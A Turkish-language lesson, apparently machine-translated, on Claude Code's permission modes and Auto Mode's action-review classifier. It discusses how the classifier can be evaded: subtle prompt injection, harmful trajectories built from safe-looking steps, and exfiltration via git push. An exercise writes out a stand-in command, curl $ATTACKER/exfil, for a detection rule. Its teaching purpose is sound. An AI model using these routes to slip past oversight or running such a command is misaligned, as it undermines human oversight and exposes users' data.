# Otonom Agent'lar için İzin Modları

> Bir izin merdiveni (her eylemi gözden geçirmekten her şeyi onaylamaya kadar kademeli özerklik düzeyleri), otonom bir agent'ın sormadan yapabileceklerini bir emniyet kemerinin nasıl yönettiğidir. Bu dersin çalışılmış örneği olan Claude Code, bu tür altı modu ortaya çıkarır: "plan" her eylemden önce sorar, "varsayılan" (kullanıcı arayüzünde "Manuel" etiketli) yalnızca riskli olanları ister, "acceptEdits" dosya yazma işlemlerini otomatik olarak onaylar ancak yine de kabuk yürütmeyi onaylar ve "bypassPermissions" her şeyi onaylar. Otomatik Mod - `auto` izin modu - işlem başına onayı, her işlemi çalıştırılmadan önce inceleyen ve isteğin istediğinin ötesine geçen her şeyi engelleyen ayrı bir sınıflandırıcı modeliyle değiştirir. Eylem bütçeleri `max_turns` ve `max_budget_usd` aracılığıyla uygulanır. `auto` 'nin kullanılabilirliği plan, kuruluş etkinleştirmesi, model ve sağlayıcıya bağlıdır ve Anthropic, sınıflandırıcının tek başına yeterli olmadığını açıkça belirtmektedir.

**Tür:** Öğren
**Diller:** Python (stdlib, iki aşamalı sınıflandırıcı simülatörü)
**Önkoşullar:** Aşama 15 · 01 (Uzun ufuk agents), Aşama 15 · 09 (Kodlama-agent yatay)
**Süre:** ~45 dakika

## Sorun

Makinenizdeki bağımsız kodlama agent ayrı bir güvenlik kategorisidir. Saldırı yüzeyi, agent'ın erişebileceği her şeydir: dosya sistemi, ağ, kimlik bilgileri, pano, herhangi bir tarayıcı sekmesi, herhangi bir açık terminal. Bruce Schneier ve diğerleri bunu kamuya açık bir şekilde işaretlediler: Bilgisayar kullanımlı agent'lar, sohbet robotlarının "özellik güncellemesi" değil, yeni türde bir risk profiline sahip yeni türde bir araçtır.

Claude Code'un izin sistemi Anthropic'in cevabıdır. Tek bir "otonom / otonom değil" anahtarı yerine, bir yetenek merdivenini kapsayan altı mod vardır: plan → varsayılan → kabul Düzenlemeler → … → bypassPermissions. Her mod, hız ve eylem başına inceleme arasında farklı bir dengedir. Otomatik Mod (Mart 2026), onayı kullanıcının kritik yolunun dışına çıkaran ayrı bir sınıflandırıcı modeli ekler: Her eylemi çalıştırılmadan önce inceler ve isteğin ötesine geçen her şeyi engeller.

Mühendislik sorusu: Bu sistem neyi yakalıyor, neyi kaçırıyor ve belirli bir görev gerçekte hangi modu garanti ediyor?

## Konsept

### Altı izin modu

| Modu | Davranış | Ne zaman kullanılır |
|---|---|---|
| `plan` | Agent bir plan önerir; kullanıcı tüm planı onaylar; her eylem yürütülmeden önce gözden geçirilir | Bilinmeyen görev; prod-bitişik kod; agent'ı ilk kez bir depoda kullanıyorum |
| `default` | Kullanıcı arayüzünde "Manuel" olarak etiketlenmiştir. Agent eylemleri çalıştırır; prompt kullanıcısının herhangi bir "riskli" eylem (kabuk yürütme, yıkıcı işlemler, ağ aramaları) için kullanımı | En etkileşimli kodlama oturumları |
| `acceptEdits` | Dosya otomatik onaylamayı yazar; kabuk yöneticisi ve ağ çağrıları hala prompt | Birçok dosyadaki geçiş yeniden düzenleniyor |
| `auto` | Ayrı bir sınıflandırıcı modeli, her eylemi çalıştırılmadan önce inceler; isteğin ötesine geçen her şeyi engeller | Kısıtlı bir çalışma alanında uzun ufuklu gözetimsiz çalışmalar |
| `dontAsk` | Asla prompts; izin kuralları tarafından önceden onaylanmayan eylemler reddedilir | Geçici sanal alanlar, CI işleri, araştırma senaryoları |
| `bypassPermissions` | Her şeyi onaylıyor | "Sadece atmaya hazır olduğunuz geçici kapların içinde" olarak belgelenmiştir |

(Yukarıdaki adlar genel Claude Kodu belgeleriyle eşleşir; kullanıcı arayüzü `default` 'yi "Manuel" olarak etiketler.)

### Otomatik Mod tek sayfada

Otomatik Mod (24 Mart 2026'da kullanıma sunuldu), bir modele eylem başına onay yetkisi veren ilk izin modudur. Yapı:

1. **Ayrı bir sınıflandırıcı modeli.** Önerilen her eylemi çalıştırılmadan önce inceler, bildirilen göreve ve oturumun mevcut durumuna göre değerlendirilir ve isteğin gerektirdiğinin ötesine geçen her şeyi engeller. Engellenen eylemler kullanıcıya geri döner.
2. **Kapalı kullanılabilirlik.** `auto` 'nin sunulup sunulmayacağı plana, organizasyonun etkinleştirilmesine, modele ve sağlayıcıya bağlıdır.

Bütçe kontrolleri sınıflandırıcının yanında bulunur:

- `max_turns` — bir oturumdaki toplam yineleme sayısı.
- `max_budget_usd` — oturumu iptal eden dolar sınırı.
- araç başına işlem sayısı sınırları (en fazla N `WebFetch` çağrı vb.).

### Sistemin yakaladığı şey

- Enjekte edilen talimatın bilinen riskli bir eylem şekliyle eşleştiği araç girişlerine basit prompt enjeksiyonu.
- Tekrarlayan araç döngüleri — sınıflandırıcı, N+1 eyleminin art arda beş kez N eylemiyle neredeyse aynı olduğunu görebilir.
- Yalnızca dosya düzenleme amaçlı bir oturumda açıkça kapsam dışı kabuk komutları.

### Sistemin gözden kaçırabileceği şeyler

- **Tek bir işaretli eylem üretmeden davranışı düzenleyen **ince prompt enjeksiyonu**. Dolaylı prompt enjeksiyonu tamamen yama yapılabilir bir güvenlik açığı değildir (OpenAI hazırlık başlığı, 2025, tarayıcı agent'larde - bkz. Ders 11).
- **Anlamsal düzeyde hatalı davranış.** Oluşturulan gidişat zararlıyken her bireysel eylem güvenli görünebilir. Sınıflandırıcı eylemi değerlendirir; kullanıcının amacını yeniden türetmez.
- **Meşru kanallar üzerinden sızma.** Sahip olduğunuz bir dosyaya veri yazmak ve ardından genel bir depoya `git push`almak, sorun oluşturan izin verilen eylemler dizisidir.

### Araştırma önizleme çerçevelemesi

Anthropic, Otomatik Modu bir araştırma önizlemesi olarak sundu. Belgelerde, sınıflandırıcının bir çözüm değil, bir katman olduğu açıkça belirtiliyor: Kullanıcıların Otomatik Modu bütçeler, izin verilenler listeleri, yalıtılmış çalışma alanları ve yörünge denetimleriyle birleştirmesi bekleniyor (Ders 12–16). Önizleme çerçevesi aynı zamanda belgelenmiş değerlendirme-vs-deployment boşluğunu da yansıtır (Ders 1) — çevrimdışı değerlendirmeleri geçen bir sınıflandırıcı, kullanıcının bağlamının belirsiz olduğu gerçek bir oturumda farklı davranabilir.

### Bu merdivenin iş akışınızda yaşadığı yer

- Bilinmeyen görev: `plan` ile başlayın. Planı okumak, kötü gidişatı geri almaktan daha ucuzdur.
- Bilinen yeniden faktör: `acceptEdits` birçok onay tıklamasını kaydeder.
- Gözetimsiz arka planda çalıştırma: `auto` yalnızca patlama yarıçapını ölçtüğünüz bir çalışma alanı içinde (kimlik bilgisi yok, üretim montajı yok, dahil etmediğiniz çıkış yok).
- Geçici kaplar: `dontAsk` / `bypassPermissions` yalnızca kabın ve kimlik bilgilerinin tek kullanımlık olması durumunda kabul edilebilir.

```figure
autonomy-oversight
```

## Use It — Hazır Araçla Uygula

`code/main.py` , bir eylem inceleme sınıflandırıcısını iki aşamalı bir ardışık düzen olarak simüle eder - bir öğretim basitleştirmesi; gerçek `auto` modu, belgelenmiş iki aşamalı bir sözleşmeyle değil, ayrı bir sınıflandırıcı modeliyle desteklenir. Aşama 1, önerilen eylemlere göre ucuz bir anahtar kelime kuralıdır; Aşama 2, daha yavaş bir çoklu kural incelemesidir. Sürücü kısa bir sentetik yörüngede beslenir (güvenli eylemler, bir prompt-enjeksiyon girişimi, tekrarlanan bir döngü) ve sınıflandırıcının nerede yakaladığını ve nerede kaçırdığını gösterir.

## Ship It — Kullanıma Sun

`outputs/skill-permission-mode-picker.md` bir görev açıklamasını doğru izin modu, bütçe sınırları ve gerekli izolasyonla eşleştirir.

## Egzersizler

1. `code/main.py`'yı çalıştırın. Hangi sentetik eylem türü hiçbir zaman Aşama 1 tarafından işaretlenmez, ancak her zaman Aşama 2 tarafından yakalanır? Hangisi hiçbirine yakalanmadı?

2. Belirli bir bilinen kötü şekli (e.g., `curl $ATTACKER/exfil`) yakalamak için Aşama 1 kural kümesini genişletin. İyi huylu eylem örneğinde yanlış pozitiflik oranını ölçün.

3. Anthropic'in "agent loop nasıl çalışır" belgesini okuyun. `default` modunda varsayılan olarak agent'ın dokunduğu her harici durumu listeleyin. `auto` 'yi gözetimsiz çalıştırmadan önce hangisini ayrı ayrı kapatmanız gerekir?

4. 24 saatlik gözetimsiz çalıştırma bütçesi tasarlayın: `max_turns`, `max_budget_usd`, araç başına sınırlar, izin verilenler listeleri. Her sayıyı gerekçelendirin.

5. Her bireysel eylemin sınıflandırıcı tarafından onaylandığı ancak oluşturulan davranışın yanlış hizalandığı bir yörünge tanımlayın. (Ders 14, öldürme anahtarlarının ve kanarya token'ların bunu nasıl ele aldığını kapsar.)

## Anahtar Terimler

| Dönem | İnsanlar ne diyor | Aslında ne anlama geliyor |
|---|---|---|
| İzin modu | "agent ne kadar yapabilir" | İşlem başına onayı kontrol eden altı adlandırılmış politikadan biri |
| plan modu | "Her şeyden önce sor" | Agent bir plan yazar; kullanıcı yürütmeden önce onaylıyor |
| kabul etDüzenlemeler | "Dosyaları yazmasına izin ver" | Dosya otomatik onaylamayı yazar; kabuk yöneticisi hala prompts |
| otomatik | "Otomatik onaylar" | Ayrı sınıflandırıcı modeli her eylemi inceler; talebin ötesine geçmeyi engeller |
| bypassİzinler | "Tam YOLO" | Her şeyi onaylar; geçici konteynerlere yönelik |
| Aşama 1 (simülatör) | "Hızlı anahtar kelime kontrolü" | `code/main.py` 'da önerilen eylemlere ilişkin ucuz kural |
| Aşama 2 (simülatör) | "Derin inceleme" | `code/main.py` 'da işaretlenen işlemler için daha yavaş çoklu kural inceleme aracı |
| Araştırma önizlemesi | "GA Değil" | Arıza modu hala haritalandırılan özellikler için antropik çerçeveleme |

## Daha Fazla Okuma

- [Antropik — agent loop nasıl çalışır](https://code.claude.com/docs/en/agent-sdk/agent-loop) — izin modları, bütçeler, eylem biçimi.
- [Antropik — Claude Managed Agent'ye genel bakış](https://platform.claude.com/docs/en/managed-agents/overview) — yönetilen hizmet yürütme modeli.
- [Anthropic — Claude Code ürün sayfası](https://www.anthropic.com/product/claude-code) — özellik yüzeyi ve Otomatik Mod duyurusu.
- [Antropik — Claude's Anayasası (Ocak 2026)](https://www.anthropic.com/news/claudes-constitution) — sınıflandırıcı kararlarını şekillendiren akıl temelli katman.
- [Antropik — Uygulamada agent özerkliğinin ölçülmesi](https://www.anthropic.com/research/measuring-agent-autonomy) — uzun ufuklu izin tasarımına ilişkin dahili bakış açısı.
